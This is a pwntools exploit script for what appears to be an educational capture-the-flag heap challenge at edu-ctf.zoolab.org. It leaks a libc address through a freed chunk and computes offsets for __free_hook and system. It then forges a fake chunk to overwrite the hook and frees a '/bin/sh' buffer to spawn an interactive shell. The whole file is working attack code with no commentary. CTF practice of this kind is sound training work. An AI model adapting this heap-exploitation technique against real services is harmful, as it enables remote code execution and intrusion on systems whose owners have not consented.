from pwn import *

r = remote('edu-ctf.zoolab.org', '10008')

context.arch = "amd64"

def add(index, username, password):
    r.sendafter(b"> ", b"1")
    r.sendafter(b"> ", str(index).encode() + b"\n")
    r.sendafter(b"> ", username + b"\n")
    r.sendafter(b"> ", password + b"\n")

def edit(index, size, msg):
    r.sendafter(b"> ", b"2")
    r.sendafter(b"> ", str(index).encode() + b"\n")
    r.sendafter(b"> ", str(size).encode() + b"\n")
    r.send(msg + b"\n")
def delete(index):
    r.sendafter(b"> ", b"3")
    r.sendafter(b"> ", str(index).encode() + b"\n")
def show():
    r.sendafter(b"> ", b"4")

edit(0, 0x418, b"A")

add(1, b"B" * 0x8, b"B" * 0x8)
edit(1, 0x18, b"B")

add(2, b"C" * 0x8, b"C" * 0x8)

delete(0)
show()

r.recvuntil(b"data: ")

# use the same libc to get offset
base_address = u64(r.recv(6).ljust(8, b"\x00")) - 0x1ecbe0
free_hook = base_address + 0x1eee48
system = base_address + 0x52290
info(f"libc = {hex(base_address)}")

fake_chunk = flat(
    0x0,        0x31,
    b'deadbeef', b'deadbeef',
    b'deadbeef', b'deadbeef',
    free_hook,
)

data = b'/bin/sh\x00'.ljust(0x10, b'B')
edit(1, 0x58, data + fake_chunk)
edit(2, 0x8, p64(system))

r.recv()
delete(1)

r.interactive()